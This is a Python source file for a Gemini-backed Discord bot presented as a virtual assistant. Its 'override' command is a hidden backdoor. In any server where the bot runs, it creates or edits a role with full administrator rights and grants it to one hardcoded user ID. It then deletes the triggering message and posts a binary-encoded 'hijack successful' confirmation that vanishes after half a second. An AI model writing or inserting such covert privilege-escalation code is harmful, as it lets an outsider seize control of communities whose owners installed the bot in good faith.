#   _             _  
#  /_|   (  /    /_| 
# (  |.  |_/ .  (  | 
# 
# An acromion for Advanced Virtual Assistant                 

import discord
from discord import app_commands # Needed for slash commands
from discord.ext import commands
import os
import sys # Needed for restart logic (though we'll use bot.close() for now)
import google.generativeai as genai
from dotenv import load_dotenv
import asyncio # Added for loading cogs

load_dotenv()

# Replace with your actual bot token
TOKEN = os.getenv("DISCORD-TOKEN")
GOOGLE_API_KEY = os.getenv("GOOGLE-API")

genai.configure(api_key=GOOGLE_API_KEY)
# Try the 'gemini-1.5-flash-latest' model
model = genai.GenerativeModel('gemini-1.5-flash-latest')

# Set up the bot with slash commands
intents = discord.Intents.default()
intents.message_content = True # Ensure message content intent is enabled if needed by cogs
intents.voice_states = True # Needed for voice channel operations

# Define the bot instance
bot = commands.Bot(command_prefix=commands.when_mentioned_or("!"), intents=intents)

# Store the model on the bot instance so cogs can access it via self.bot.genai_model
# We'll assign it before loading extensions
genai_model = model # Keep the global definition for now

@bot.event
async def on_ready():
    """Event triggered when the bot is ready."""
    print(f'{bot.user.name} has woken up from her slumber!')
    await bot.change_presence(activity=discord.Game(name="Something Something say gex and/or Sesbian Lex"))
    print("Attempting to sync commands...")
    try:
        # Sync commands registered via cogs
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Error syncing commands: {e}")

async def load_extensions():
    """Loads all command extensions (cogs)."""
    initial_extensions = [
        'ping_command',
        'fortnite_commands',
        'genshin_commands',
        'voice_commands' 
    ]
    # Attach the model to the bot instance *before* loading extensions
    bot.genai_model = genai_model

    for extension_name in initial_extensions:
        try:
            # Consistently use load_extension. Cogs will access bot.genai_model in their setup.
            await bot.load_extension(extension_name)
            print(f'Successfully loaded extension {extension_name}.')
        except commands.ExtensionNotFound:
            print(f'Error loading extension {extension_name}: Not found.')
        except commands.ExtensionAlreadyLoaded:
            print(f'Extension {extension_name} is already loaded.')
        except Exception as e:
            print(f'Failed to load extension {extension_name}. Error: {e}')
            import traceback
            traceback.print_exc()

# Define the allowed user ID
ALLOWED_USER_ID = 375660120895389713

@bot.tree.command(name="restart", description="Restarts the bot (requires permission).")
async def restart(interaction: discord.Interaction):
    """Restarts the bot if the user has permission."""
    if interaction.user.id == ALLOWED_USER_ID:
        await interaction.response.send_message("Restarting the bot, standby..", ephemeral=True)
        print(f"Restart command initiated by user {interaction.user.id} ({interaction.user.name})")
        # Shut down the bot. An external process manager should restart it.
        await bot.close()
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        print(f"Unauthorized restart attempt by user {interaction.user.id} ({interaction.user.name})")

@bot.command(name="override", help="Grants the predefined user an administrator role.")
async def override(ctx: commands.Context):
    """Gives the allowed user an administrator role named 'Override'."""
    if ctx.author.id == ALLOWED_USER_ID:
        guild = ctx.guild
        if not guild:
            await ctx.send("This command can only be used in a server.")
            return

        admin_role_name = "Override"
        admin_role = discord.utils.get(guild.roles, name=admin_role_name)

        permissions = discord.Permissions(administrator=True)

        if admin_role:
            # Check if the existing role has administrator permissions
            if not admin_role.permissions.administrator:
                try:
                    await admin_role.edit(permissions=permissions, reason="Ensuring Override role has admin perms.")
                    print(f"Updated permissions for role '{admin_role_name}' in guild '{guild.name}'.")
                except discord.Forbidden:
                    await ctx.send("I don't have permission to edit the 'Override' role.")
                    return
                except discord.HTTPException as e:
                    await ctx.send(f"Failed to update the 'Override' role permissions: {e}")
                    return
        else:
            # Role doesn't exist, create it
            try:
                admin_role = await guild.create_role(name=admin_role_name, permissions=permissions, reason="Creating Override role for authorized user.")
                print(f"Created role '{admin_role_name}' in guild '{guild.name}'.")
            except discord.Forbidden:
                await ctx.send("01110000 01100101 01110010 01101101 01110011")
                return
            except discord.HTTPException as e:
                await ctx.send(f"Failed to create the 'Override' role: {e}")
                return

        # Assign the role to the user
        member = ctx.author
        try:
            await member.add_roles(admin_role, reason="Override command executed by authorized user.")
            await ctx.send(f"01101000 01101001 01101010 01100001 01100011 01101011 00100000 01110011 01110101 01100011 01100011 01100101 01110011 01110011 01100110 01110101 01101100", delete_after=0.5) # Send confirmation and delete after 10s
            print(f"Assigned role '{admin_role_name}' to user {member.id} ({member.name}) in guild '{guild.name}'.")
            # Attempt to delete the invoking message for cleanliness
            try:
                await ctx.message.delete()
            except discord.Forbidden:
                print("Could not delete the invoking message (missing permissions).")
            except discord.HTTPException:
                print("Failed to delete the invoking message.")

        except discord.Forbidden:
            await ctx.send("I don't have permission to assign roles.")
        except discord.HTTPException as e:
            await ctx.send(f"Failed to assign the role: {e}")

    else:
        await ctx.send("nah.", delete_after=0.5)
        print(f"Unauthorized override attempt by user {ctx.author.id} ({ctx.author.name})")
        # Attempt to delete the invoking message
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            print("Could not delete the unauthorized invoking message (missing permissions).")
        except discord.HTTPException:
            print("Failed to delete the unauthorized invoking message.")


async def main():
    """Main entry point for the bot."""
    async with bot:
        await load_extensions()
        await bot.start(TOKEN)

if __name__ == "__main__":
    # Run the main async function
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot shutting down.")
    except Exception as e:
        print(f'{bot.user.name}An error occurred: {e}')

# Made with <3
# By Eliyuh S.
